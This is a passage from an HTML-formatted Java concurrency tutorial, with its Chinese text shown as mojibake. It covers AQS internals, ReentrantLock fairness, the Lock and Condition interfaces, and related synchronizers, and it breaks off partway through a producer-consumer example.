<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">final</span> <span class="hljs-type">boolean</span> <span class="hljs-title function_">acquireQueued</span><span class="hljs-params">(<span class="hljs-keyword">final</span> Node node, <span class="hljs-type">int</span> arg)</span> {
    <span class="hljs-type">boolean</span> <span class="hljs-variable">failed</span> <span class="hljs-operator">=</span> <span class="hljs-literal">true</span>;
    <span class="hljs-keyword">try</span> {
        <span class="hljs-type">boolean</span> <span class="hljs-variable">interrupted</span> <span class="hljs-operator">=</span> <span class="hljs-literal">false</span>;
        <span class="hljs-keyword">for</span> (;;) {
            <span class="hljs-keyword">final</span> <span class="hljs-type">Node</span> <span class="hljs-variable">p</span> <span class="hljs-operator">=</span> node.predecessor();
            
            <span class="hljs-comment">// å‰é©±æ˜¯headï¼Œå°è¯•è·å–é”</span>
            <span class="hljs-keyword">if</span> (p == head &amp;&amp; tryAcquire(arg)) {
                setHead(node);
                p.next = <span class="hljs-literal">null</span>; <span class="hljs-comment">// help GC</span>
                failed = <span class="hljs-literal">false</span>;
                <span class="hljs-keyword">return</span> interrupted;
            }
            
            <span class="hljs-comment">// è·å–å¤±è´¥ï¼Œæ£€æŸ¥æ˜¯å¦éœ€è¦é˜»å¡</span>
            <span class="hljs-keyword">if</span> (shouldParkAfterFailedAcquire(p, node) &amp;&amp;
                parkAndCheckInterrupt())
                interrupted = <span class="hljs-literal">true</span>;
        }
    } <span class="hljs-keyword">finally</span> {
        <span class="hljs-keyword">if</span> (failed)
            cancelAcquire(node);
    }
}
</code></pre>
<h5 data-id="heading-143">parkAndCheckInterruptï¼ˆé˜»å¡ï¼‰</h5>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">private</span> <span class="hljs-keyword">final</span> <span class="hljs-type">boolean</span> <span class="hljs-title function_">parkAndCheckInterrupt</span><span class="hljs-params">()</span> {
    LockSupport.park(<span class="hljs-built_in">this</span>); <span class="hljs-comment">// é˜»å¡å½“å‰çº¿ç¨‹</span>
    <span class="hljs-keyword">return</span> Thread.interrupted(); <span class="hljs-comment">// è¿”å›ä¸­æ–­çŠ¶æ€å¹¶æ¸…é™¤</span>
}
</code></pre>
<h3 data-id="heading-144">6.4 åŸºäºAQSçš„å®ç°ç±»</h3>
<h4 data-id="heading-145">ReentrantLock</h4>
<p><strong>ReentrantLockåŸºäºAQSçš„ç‹¬å æ¨¡å¼å®ç°ã€‚</strong></p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">ReentrantLock</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">Lock</span> {
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">final</span> Sync sync;
    
    <span class="hljs-keyword">abstract</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Sync</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">AbstractQueuedSynchronizer</span> {
        <span class="hljs-comment">// å®ç°tryAcquireå’ŒtryRelease</span>
    }
    
    <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">NonfairSync</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">Sync</span> {
        <span class="hljs-comment">// éå…¬å¹³é”å®ç°</span>
    }
    
    <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">FairSync</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">Sync</span> {
        <span class="hljs-comment">// å…¬å¹³é”å®ç°</span>
    }
}
</code></pre>
<h4 data-id="heading-146">ReentrantReadWriteLock</h4>
<p><strong>ReentrantReadWriteLockåŸºäºAQSçš„å…±äº«æ¨¡å¼å’Œç‹¬å æ¨¡å¼å®ç°ã€‚</strong></p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">ReentrantReadWriteLock</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">ReadWriteLock</span> {
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">final</span> ReadLock readerLock;
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">final</span> WriteLock writerLock;
    
    <span class="hljs-comment">// ä½¿ç”¨AQSçš„stateï¼š</span>
    <span class="hljs-comment">// é«˜16ä½ï¼šè¯»é”è®¡æ•°</span>
    <span class="hljs-comment">// ä½16ä½ï¼šå†™é”è®¡æ•°</span>
}
</code></pre>
<h4 data-id="heading-147">Semaphore</h4>
<p><strong>SemaphoreåŸºäºAQSçš„å…±äº«æ¨¡å¼å®ç°ã€‚</strong></p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Semaphore</span> {
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">final</span> Sync sync;
    
    <span class="hljs-keyword">abstract</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Sync</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">AbstractQueuedSynchronizer</span> {
        <span class="hljs-comment">// stateè¡¨ç¤ºå¯ç”¨è®¸å¯è¯æ•°é‡</span>
        <span class="hljs-comment">// tryAcquireSharedï¼šè·å–è®¸å¯è¯</span>
        <span class="hljs-comment">// tryReleaseSharedï¼šé‡Šæ”¾è®¸å¯è¯</span>
    }
}
</code></pre>
<h4 data-id="heading-148">CountDownLatch</h4>
<p><strong>CountDownLatchåŸºäºAQSçš„å…±äº«æ¨¡å¼å®ç°ã€‚</strong></p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">CountDownLatch</span> {
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Sync</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">AbstractQueuedSynchronizer</span> {
        <span class="hljs-comment">// stateè¡¨ç¤ºè®¡æ•°å™¨å€¼</span>
        <span class="hljs-comment">// countDownï¼šstate - 1</span>
        <span class="hljs-comment">// awaitï¼šç­‰å¾…state == 0</span>
    }
}
</code></pre>
<h4 data-id="heading-149">CyclicBarrier</h4>
<p><strong>CyclicBarrieråŸºäºReentrantLockå’ŒConditionå®ç°ã€‚</strong></p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">CyclicBarrier</span> {
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">final</span> <span class="hljs-type">ReentrantLock</span> <span class="hljs-variable">lock</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ReentrantLock</span>();
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">final</span> <span class="hljs-type">Condition</span> <span class="hljs-variable">trip</span> <span class="hljs-operator">=</span> lock.newCondition();
    <span class="hljs-comment">// ä½¿ç”¨ReentrantLockå’ŒConditionå®ç°</span>
}
</code></pre>
<hr/>
<h2 data-id="heading-150">ç¬¬ä¸ƒç«  Lockæ¥å£ä¸ReentrantLock</h2>
<h3 data-id="heading-151">7.1 Lockæ¥å£</h3>
<h4 data-id="heading-152">Lockæ¥å£çš„æ–¹æ³•</h4>
<p><strong>Lockæ¥å£æä¾›äº†æ¯”synchronizedæ›´çµæ´»çš„é”æ“ä½œã€‚</strong></p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">interface</span> <span class="hljs-title class_">Lock</span> {
    <span class="hljs-keyword">void</span> <span class="hljs-title function_">lock</span><span class="hljs-params">()</span>;                        <span class="hljs-comment">// è·å–é”ï¼ˆé˜»å¡ï¼‰</span>
    <span class="hljs-keyword">void</span> <span class="hljs-title function_">lockInterruptibly</span><span class="hljs-params">()</span> <span class="hljs-keyword">throws</span> InterruptedException;  <span class="hljs-comment">// å¯ä¸­æ–­è·å–é”</span>
    <span class="hljs-type">boolean</span> <span class="hljs-title function_">tryLock</span><span class="hljs-params">()</span>;                  <span class="hljs-comment">// å°è¯•è·å–é”ï¼ˆä¸é˜»å¡ï¼‰</span>
    <span class="hljs-type">boolean</span> <span class="hljs-title function_">tryLock</span><span class="hljs-params">(<span class="hljs-type">long</span> time, TimeUnit unit)</span> <span class="hljs-keyword">throws</span> InterruptedException;  <span class="hljs-comment">// è¶…æ—¶è·å–é”</span>
    <span class="hljs-keyword">void</span> <span class="hljs-title function_">unlock</span><span class="hljs-params">()</span>;                      <span class="hljs-comment">// é‡Šæ”¾é”</span>
    Condition <span class="hljs-title function_">newCondition</span><span class="hljs-params">()</span>;           <span class="hljs-comment">// è·å–æ¡ä»¶å¯¹è±¡</span>
}
</code></pre>
<p><strong>æ–¹æ³•è¯´æ˜ï¼š</strong></p>
<ol>
<li><strong>lock()</strong> - æœ€å¸¸ç”¨çš„æ–¹æ³•ï¼Œè·å–é”ï¼Œå¦‚æœé”è¢«å ç”¨åˆ™é˜»å¡ç­‰å¾…</li>
<li><strong>lockInterruptibly()</strong> - å¯ä¸­æ–­çš„è·å–é”ï¼Œçº¿ç¨‹åœ¨ç­‰å¾…æ—¶å¯ä»¥è¢«ä¸­æ–­</li>
<li><strong>tryLock()</strong> - å°è¯•è·å–é”ï¼Œç«‹å³è¿”å›true/falseï¼Œä¸ä¼šé˜»å¡</li>
<li><strong>tryLock(time, unit)</strong> - åœ¨æŒ‡å®šæ—¶é—´å†…å°è¯•è·å–é”ï¼Œè¶…æ—¶è¿”å›false</li>
<li><strong>unlock()</strong> - é‡Šæ”¾é”ï¼Œå¿…é¡»åœ¨finallyå—ä¸­è°ƒç”¨</li>
<li><strong>newCondition()</strong> - åˆ›å»ºConditionå¯¹è±¡ï¼Œç”¨äºçº¿ç¨‹é—´çš„åè°ƒ</li>
</ol>
<h4 data-id="heading-153">Lock vs synchronized</h4>








































<table><thead><tr><th>ç‰¹æ€§</th><th>synchronized</th><th>Lock</th></tr></thead><tbody><tr><td><strong>è·å–é”æ–¹å¼</strong></td><td>è‡ªåŠ¨è·å–å’Œé‡Šæ”¾</td><td>æ‰‹åŠ¨è·å–å’Œé‡Šæ”¾</td></tr><tr><td><strong>å¯ä¸­æ–­</strong></td><td>âŒ ä¸å¯ä¸­æ–­</td><td>âœ… å¯ä¸­æ–­ï¼ˆlockInterruptiblyï¼‰</td></tr><tr><td><strong>è¶…æ—¶è·å–</strong></td><td>âŒ ä¸æ”¯æŒ</td><td>âœ… æ”¯æŒï¼ˆtryLockï¼‰</td></tr><tr><td><strong>å…¬å¹³é”</strong></td><td>âŒ éå…¬å¹³</td><td>âœ… å¯é€‰å…¬å¹³/éå…¬å¹³</td></tr><tr><td><strong>å¤šä¸ªæ¡ä»¶</strong></td><td>âŒ åªæœ‰ä¸€ä¸ªæ¡ä»¶</td><td>âœ… å¯ä»¥æœ‰å¤šä¸ªCondition</td></tr><tr><td><strong>ä½¿ç”¨å¤æ‚åº¦</strong></td><td>ç®€å•</td><td>è¾ƒå¤æ‚ï¼ˆéœ€è¦finallyé‡Šæ”¾ï¼‰</td></tr></tbody></table>
<p><strong>ä½¿ç”¨ç¤ºä¾‹å¯¹æ¯”ï¼š</strong></p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-comment">// synchronizedæ–¹å¼ï¼ˆç®€å•ä½†åŠŸèƒ½æœ‰é™ï¼‰</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">synchronized</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">method</span><span class="hljs-params">()</span> {
    <span class="hljs-comment">// åŒæ­¥ä»£ç </span>
}

<span class="hljs-comment">// Lockæ–¹å¼ï¼ˆæ›´çµæ´»ï¼‰</span>
<span class="hljs-keyword">private</span> <span class="hljs-type">Lock</span> <span class="hljs-variable">lock</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ReentrantLock</span>();
<span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">method</span><span class="hljs-params">()</span> {
    lock.lock();
    <span class="hljs-keyword">try</span> {
        <span class="hljs-comment">// åŒæ­¥ä»£ç </span>
    } <span class="hljs-keyword">finally</span> {
        lock.unlock(); <span class="hljs-comment">// âš ï¸ å¿…é¡»åœ¨finallyä¸­é‡Šæ”¾ï¼Œé˜²æ­¢æ­»é”</span>
    }
}

<span class="hljs-comment">// å¯ä¸­æ–­çš„è·å–é”</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">interruptibleMethod</span><span class="hljs-params">()</span> <span class="hljs-keyword">throws</span> InterruptedException {
    lock.lockInterruptibly();  <span class="hljs-comment">// ç­‰å¾…æ—¶å¯ä»¥å“åº”ä¸­æ–­</span>
    <span class="hljs-keyword">try</span> {
        <span class="hljs-comment">// åŒæ­¥ä»£ç </span>
    } <span class="hljs-keyword">finally</span> {
        lock.unlock();
    }
}

<span class="hljs-comment">// å°è¯•è·å–é”ï¼ˆä¸é˜»å¡ï¼‰</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">tryLockMethod</span><span class="hljs-params">()</span> {
    <span class="hljs-keyword">if</span> (lock.tryLock()) {  <span class="hljs-comment">// ç«‹å³è¿”å›ï¼Œä¸ç­‰å¾…</span>
        <span class="hljs-keyword">try</span> {
            <span class="hljs-comment">// åŒæ­¥ä»£ç </span>
        } <span class="hljs-keyword">finally</span> {
            lock.unlock();
        }
    } <span class="hljs-keyword">else</span> {
        <span class="hljs-comment">// è·å–é”å¤±è´¥ï¼Œæ‰§è¡Œå…¶ä»–é€»è¾‘</span>
    }
}
</code></pre>
<h3 data-id="heading-154">7.2 ReentrantLock</h3>
<h4 data-id="heading-155">å¯é‡å…¥æ€§</h4>
<p><strong>å¯é‡å…¥é”ï¼š</strong> åŒä¸€ä¸ªçº¿ç¨‹å¯ä»¥å¤šæ¬¡è·å–åŒä¸€æŠŠé”ã€‚</p>
<p><strong>ç†è§£è¦ç‚¹ï¼š</strong></p>
<ul>
<li>å°±åƒä¸€æŠŠé’¥åŒ™å¯ä»¥æ‰“å¼€åŒä¸€æ‰‡é—¨å¤šæ¬¡</li>
<li>é¿å…æ­»é”ï¼šæ–¹æ³•Aè°ƒç”¨æ–¹æ³•Bï¼Œä¸¤ä¸ªæ–¹æ³•éƒ½éœ€è¦åŒä¸€æŠŠé”</li>
<li>ReentrantLockæ˜¯å¯é‡å…¥çš„ï¼Œsynchronizedä¹Ÿæ˜¯å¯é‡å…¥çš„</li>
</ul>
<p><strong>ç¤ºä¾‹ä»£ç ï¼š</strong></p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-type">ReentrantLock</span> <span class="hljs-variable">lock</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ReentrantLock</span>();

<span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">method1</span><span class="hljs-params">()</span> {
    lock.lock();  <span class="hljs-comment">// ç¬¬ä¸€æ¬¡è·å–é”</span>
    <span class="hljs-keyword">try</span> {
        method2();  <span class="hljs-comment">// è°ƒç”¨method2ï¼Œå¯ä»¥å†æ¬¡è·å–åŒä¸€æŠŠé”</span>
    } <span class="hljs-keyword">finally</span> {
        lock.unlock();  <span class="hljs-comment">// ç¬¬ä¸€æ¬¡é‡Šæ”¾</span>
    }
}

<span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">method2</span><span class="hljs-params">()</span> {
    lock.lock();  <span class="hljs-comment">// ç¬¬äºŒæ¬¡è·å–é”ï¼ˆå¯é‡å…¥ï¼‰</span>
    <span class="hljs-keyword">try</span> {
        <span class="hljs-comment">// æ‰§è¡Œä»»åŠ¡</span>
    } <span class="hljs-keyword">finally</span> {
        lock.unlock();  <span class="hljs-comment">// ç¬¬äºŒæ¬¡é‡Šæ”¾</span>
    }
}
</code></pre>
<p><strong>å®ç°åŸç†ï¼ˆç®€å•ç†è§£ï¼‰ï¼š</strong></p>
<ul>
<li>ä½¿ç”¨stateè®°å½•é‡å…¥æ¬¡æ•°</li>
<li>æ¯æ¬¡lock()ï¼Œstate + 1</li>
<li>æ¯æ¬¡unlock()ï¼Œstate - 1</li>
<li>state == 0æ—¶ï¼Œé”è¢«å®Œå…¨é‡Šæ”¾</li>
</ul>
<h4 data-id="heading-156">å…¬å¹³é”ä¸éå…¬å¹³é”</h4>
<p><strong>æ ¸å¿ƒåŒºåˆ«ï¼š</strong> è·å–é”çš„é¡ºåºä¸åŒ</p>
<h5 data-id="heading-157">éå…¬å¹³é”ï¼ˆé»˜è®¤ï¼‰</h5>
<p><strong>ç‰¹ç‚¹ï¼š</strong> æ–°æ¥çš„çº¿ç¨‹å¯èƒ½"æ’é˜Ÿ"ï¼Œç›´æ¥å°è¯•è·å–é”</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-type">ReentrantLock</span> <span class="hljs-variable">lock</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ReentrantLock</span>();  <span class="hljs-comment">// é»˜è®¤éå…¬å¹³é”</span>
<span class="hljs-comment">// æˆ–</span>
<span class="hljs-type">ReentrantLock</span> <span class="hljs-variable">lock</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ReentrantLock</span>(<span class="hljs-literal">false</span>);  <span class="hljs-comment">// æ˜¾å¼æŒ‡å®šéå…¬å¹³é”</span>
</code></pre>
<p><strong>å·¥ä½œåŸç†ï¼š</strong></p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-comment">// éå…¬å¹³é”ï¼šå…ˆå°è¯•ç›´æ¥è·å–é”ï¼Œå¤±è´¥æ‰æ’é˜Ÿ</span>
lock() {
    <span class="hljs-keyword">if</span> (CASå°è¯•ç›´æ¥è·å–é”) {  <span class="hljs-comment">// æ–°çº¿ç¨‹å¯èƒ½æ’é˜Ÿ</span>
        <span class="hljs-keyword">return</span>;  <span class="hljs-comment">// æˆåŠŸ</span>
    }
    åŠ å…¥é˜Ÿåˆ—ç­‰å¾…;  <span class="hljs-comment">// å¤±è´¥æ‰æ’é˜Ÿ</span>
}
</code></pre>
<p><strong>ä¼˜ç¼ºç‚¹ï¼š</strong></p>
<ul>
<li>âœ… æ€§èƒ½æ›´å¥½ï¼ˆå‡å°‘çº¿ç¨‹åˆ‡æ¢ï¼‰</li>
<li>âœ… ååé‡æ›´é«˜</li>
<li>âŒ å¯èƒ½å¯¼è‡´çº¿ç¨‹é¥¥é¥¿ï¼ˆæŸäº›çº¿ç¨‹ä¸€ç›´è·å–ä¸åˆ°é”ï¼‰</li>
</ul>
<p><strong>é€‚ç”¨åœºæ™¯ï¼š</strong> å¤§å¤šæ•°åœºæ™¯æ¨èä½¿ç”¨éå…¬å¹³é”</p>
<h5 data-id="heading-158">å…¬å¹³é”</h5>
<p><strong>ç‰¹ç‚¹ï¼š</strong> ä¸¥æ ¼æŒ‰ç…§ç­‰å¾…æ—¶é—´é¡ºåºè·å–é”ï¼Œå…ˆæ¥å…ˆæœåŠ¡</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-type">ReentrantLock</span> <span class="hljs-variable">lock</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ReentrantLock</span>(<span class="hljs-literal">true</span>);  <span class="hljs-comment">// å…¬å¹³é”</span>
</code></pre>
<p><strong>å·¥ä½œåŸç†ï¼š</strong></p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-comment">// å…¬å¹³é”ï¼šå…ˆæ£€æŸ¥é˜Ÿåˆ—ï¼Œæœ‰ç­‰å¾…çš„çº¿ç¨‹å°±æ’é˜Ÿ</span>
lock() {
    <span class="hljs-keyword">if</span> (é˜Ÿåˆ—ä¸­æœ‰ç­‰å¾…çš„çº¿ç¨‹) {
        åŠ å…¥é˜Ÿåˆ—ç­‰å¾…;  <span class="hljs-comment">// ä¸æ’é˜Ÿ</span>
    } <span class="hljs-keyword">else</span> {
        å°è¯•è·å–é”;
    }
}
</code></pre>
<p><strong>ä¼˜ç¼ºç‚¹ï¼š</strong></p>
<ul>
<li>âœ… å…¬å¹³æ€§ä¿è¯ï¼Œé¿å…é¥¥é¥¿</li>
<li>âœ… ç­‰å¾…æ—¶é—´é•¿çš„çº¿ç¨‹ä¼˜å…ˆè·å¾—é”</li>
<li>âŒ æ€§èƒ½è¾ƒå·®ï¼ˆæ›´å¤šä¸Šä¸‹æ–‡åˆ‡æ¢ï¼‰</li>
<li>âŒ ååé‡è¾ƒä½</li>
</ul>
<p><strong>é€‚ç”¨åœºæ™¯ï¼š</strong> éœ€è¦ä¸¥æ ¼å…¬å¹³æ€§çš„åœºæ™¯</p>
<p><strong>æ€§èƒ½å¯¹æ¯”æ€»ç»“ï¼š</strong></p>
<ul>
<li><strong>éå…¬å¹³é”</strong>ï¼šæ€§èƒ½å¥½ï¼ˆçº¦å¿«10-20%ï¼‰ï¼Œé€‚åˆå¤§å¤šæ•°åœºæ™¯</li>
<li><strong>å…¬å¹³é”</strong>ï¼šæ€§èƒ½å·®ï¼Œä½†æ›´å…¬å¹³ï¼Œé€‚åˆå¯¹å…¬å¹³æ€§è¦æ±‚é«˜çš„åœºæ™¯</li>
<li><strong>é€‰æ‹©å»ºè®®</strong>ï¼šé™¤éæœ‰ç‰¹æ®Šéœ€æ±‚ï¼Œå¦åˆ™ä½¿ç”¨éå…¬å¹³é”</li>
</ul>
<h3 data-id="heading-159">7.3 Conditionæ¥å£</h3>
<h4 data-id="heading-160">Conditionçš„ä½œç”¨</h4>
<p><strong>Condition</strong>æä¾›äº†ç±»ä¼¼Object.wait/notifyçš„çº¿ç¨‹ç­‰å¾…å’Œå”¤é†’æœºåˆ¶ï¼Œä½†åŠŸèƒ½æ›´å¼ºå¤§ã€‚</p>
<p><strong>ç†è§£è¦ç‚¹ï¼š</strong></p>
<ul>
<li>Conditionæ˜¯Lockçš„ç­‰å¾…/é€šçŸ¥æœºåˆ¶</li>
<li>ä¸€ä¸ªLockå¯ä»¥åˆ›å»ºå¤šä¸ªCondition</li>
<li>æ¯”wait/notifyæ›´çµæ´»ã€æ›´ç²¾ç¡®</li>
</ul>
<p><strong>Conditionæ¥å£æ–¹æ³•ï¼š</strong></p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">interface</span> <span class="hljs-title class_">Condition</span> {
    <span class="hljs-keyword">void</span> <span class="hljs-title function_">await</span><span class="hljs-params">()</span> <span class="hljs-keyword">throws</span> InterruptedException;              <span class="hljs-comment">// ç­‰å¾…ï¼Œå¯ä¸­æ–­</span>
    <span class="hljs-keyword">void</span> <span class="hljs-title function_">awaitUninterruptibly</span><span class="hljs-params">()</span>;                          <span class="hljs-comment">// ç­‰å¾…ï¼Œä¸å¯ä¸­æ–­</span>
    <span class="hljs-type">long</span> <span class="hljs-title function_">awaitNanos</span><span class="hljs-params">(<span class="hljs-type">long</span> nanosTimeout)</span> <span class="hljs-keyword">throws</span> InterruptedException;  <span class="hljs-comment">// è¶…æ—¶ç­‰å¾…ï¼ˆçº³ç§’ï¼‰</span>
    <span class="hljs-type">boolean</span> <span class="hljs-title function_">await</span><span class="hljs-params">(<span class="hljs-type">long</span> time, TimeUnit unit)</span> <span class="hljs-keyword">throws</span> InterruptedException;  <span class="hljs-comment">// è¶…æ—¶ç­‰å¾…</span>
    <span class="hljs-type">boolean</span> <span class="hljs-title function_">awaitUntil</span><span class="hljs-params">(Date deadline)</span> <span class="hljs-keyword">throws</span> InterruptedException;  <span class="hljs-comment">// ç­‰å¾…åˆ°æŒ‡å®šæ—¶é—´</span>
    
    <span class="hljs-keyword">void</span> <span class="hljs-title function_">signal</span><span class="hljs-params">()</span>;        <span class="hljs-comment">// å”¤é†’ä¸€ä¸ªç­‰å¾…çº¿ç¨‹</span>
    <span class="hljs-keyword">void</span> <span class="hljs-title function_">signalAll</span><span class="hljs-params">()</span>;     <span class="hljs-comment">// å”¤é†’æ‰€æœ‰ç­‰å¾…çº¿ç¨‹</span>
}
</code></pre>
<h4 data-id="heading-161">await()æ–¹æ³•ï¼ˆç­‰å¾…æ¡ä»¶ï¼‰</h4>
<p><strong>ä½œç”¨ï¼š</strong> è®©å½“å‰çº¿ç¨‹ç­‰å¾…ï¼Œç›´åˆ°è¢«signalå”¤é†’</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-type">Lock</span> <span class="hljs-variable">lock</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ReentrantLock</span>();
<span class="hljs-type">Condition</span> <span class="hljs-variable">condition</span> <span class="hljs-operator">=</span> lock.newCondition();

<span class="hljs-comment">// ç­‰å¾…æ¡ä»¶</span>
lock.lock();
<span class="hljs-keyword">try</span> {
    condition.await();  <span class="hljs-comment">// é‡Šæ”¾é”å¹¶ç­‰å¾…ï¼Œè¢«å”¤é†’åé‡æ–°è·å–é”</span>
} <span class="hljs-keyword">finally</span> {
    lock.unlock();
}
</code></pre>
<p><strong>æ‰§è¡Œæµç¨‹ï¼ˆç®€å•ç†è§£ï¼‰ï¼š</strong></p>
<ol>
<li>å½“å‰çº¿ç¨‹åŠ å…¥æ¡ä»¶ç­‰å¾…é˜Ÿåˆ—</li>
<li>é‡Šæ”¾é”</li>
<li>é˜»å¡ç­‰å¾…</li>
<li>è¢«signalå”¤é†’åï¼Œé‡æ–°è·å–é”</li>
<li>ç»§ç»­æ‰§è¡Œ</li>
</ol>
<h4 data-id="heading-162">signal()/signalAll()æ–¹æ³•ï¼ˆå”¤é†’ç­‰å¾…çº¿ç¨‹ï¼‰</h4>
<p><strong>signal()ï¼š</strong> å”¤é†’ä¸€ä¸ªç­‰å¾…çº¿ç¨‹ï¼ˆç±»ä¼¼notifyï¼‰<br/>
<strong>signalAll()ï¼š</strong> å”¤é†’æ‰€æœ‰ç­‰å¾…çº¿ç¨‹ï¼ˆç±»ä¼¼notifyAllï¼‰</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-comment">// å”¤é†’ä¸€ä¸ªç­‰å¾…çº¿ç¨‹</span>
lock.lock();
<span class="hljs-keyword">try</span> {
    condition.signal();  <span class="hljs-comment">// å”¤é†’ä¸€ä¸ªç­‰å¾…çš„çº¿ç¨‹</span>
} <span class="hljs-keyword">finally</span> {
    lock.unlock();
}

<span class="hljs-comment">// å”¤é†’æ‰€æœ‰ç­‰å¾…çº¿ç¨‹</span>
lock.lock();
<span class="hljs-keyword">try</span> {
    condition.signalAll();  <span class="hljs-comment">// å”¤é†’æ‰€æœ‰ç­‰å¾…çš„çº¿ç¨‹</span>
} <span class="hljs-keyword">finally</span> {
    lock.unlock();
}
</code></pre>
<h4 data-id="heading-163">Condition vs wait/notify</h4>



































<table><thead><tr><th>ç‰¹æ€§</th><th>wait/notify</th><th>Condition</th></tr></thead><tbody><tr><td><strong>å‰ç½®æ¡ä»¶</strong></td><td>å¿…é¡»åœ¨synchronizedå—ä¸­</td><td>å¿…é¡»å…ˆè·å–Lock</td></tr><tr><td><strong>å¤šä¸ªæ¡ä»¶</strong></td><td>âŒ ä¸æ”¯æŒ</td><td>âœ… æ”¯æŒï¼ˆä¸€ä¸ªLockå¤šä¸ªConditionï¼‰</td></tr><tr><td><strong>å¯ä¸­æ–­</strong></td><td>âœ… æ”¯æŒ</td><td>âœ… æ”¯æŒ</td></tr><tr><td><strong>è¶…æ—¶ç­‰å¾…</strong></td><td>âœ… æœ‰é™æ”¯æŒ</td><td>âœ… æ›´çµæ´»çš„è¶…æ—¶</td></tr><tr><td><strong>ä½¿ç”¨åœºæ™¯</strong></td><td>ç®€å•çš„ç­‰å¾…/é€šçŸ¥</td><td>å¤æ‚çš„åŒæ­¥æ§åˆ¶</td></tr></tbody></table>
<p><strong>ä¼˜åŠ¿æ€»ç»“ï¼š</strong></p>
<ul>
<li>âœ… <strong>å¤šä¸ªæ¡ä»¶</strong>ï¼šå¯ä»¥åˆ›å»ºå¤šä¸ªConditionï¼Œç²¾ç¡®æ§åˆ¶ä¸åŒæ¡ä»¶çš„ç­‰å¾…/å”¤é†’</li>
<li>âœ… <strong>æ›´çµæ´»</strong>ï¼šè¶…æ—¶ç­‰å¾…ã€ä¸­æ–­æ§åˆ¶æ›´å¼ºå¤§</li>
<li>âœ… <strong>æ€§èƒ½æ›´å¥½</strong>ï¼šé¿å…ä¸å¿…è¦çš„çº¿ç¨‹å”¤é†’</li>
</ul>
<h4 data-id="heading-164">ç”Ÿäº§è€…æ¶ˆè´¹è€…æ¨¡å¼å®ç°</h4>
<p><strong>ä½¿ç”¨Conditionçš„ä¼˜åŠ¿ï¼š</strong> å¯ä»¥ä¸º"é˜Ÿåˆ—æ»¡"å’Œ"é˜Ÿåˆ—ç©º"åˆ›å»ºä¸åŒçš„Condition</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-type">Lock</span> <span class="hljs-variable">lock</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ReentrantLock</span>();
<span class="hljs-type">Condition</span> <span class="hljs-variable">notFull</span> <span class="hljs-operator">=</span> lock.newCondition();   <span class="hljs-comment">// é˜Ÿåˆ—ä¸æ»¡çš„æ¡ä»¶</span>
<span class="hljs-type">Condition</span> <span class="hljs-variable">notEmpty</span> <span class="hljs-operator">=</span> lock.newCondition();  <span class="hljs-comment">// é˜Ÿåˆ—ä¸ç©ºçš„æ¡ä»¶</span>

